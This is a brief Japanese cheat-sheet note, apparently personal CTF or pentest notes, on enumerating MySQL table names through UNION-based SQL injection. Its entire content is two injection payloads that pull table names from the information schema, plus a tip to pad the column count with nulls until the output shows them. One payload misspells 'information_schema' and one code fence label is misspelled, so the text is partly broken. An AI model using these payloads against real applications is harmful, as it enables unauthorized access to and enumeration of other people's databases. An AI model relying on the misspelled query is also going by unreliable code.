# union_all

## mysqlでテーブル名を確認する

```mysql
` UNION ALL SELECT 1,1,table_schema,table_name from information_chema.tables
```

nullの値を増やしていく

```msyql
' UNION SELECT null, table_name FROM INFORMATION_SCHEMA.TABLES; #
```

出力結果にテーブル名が含まれる。

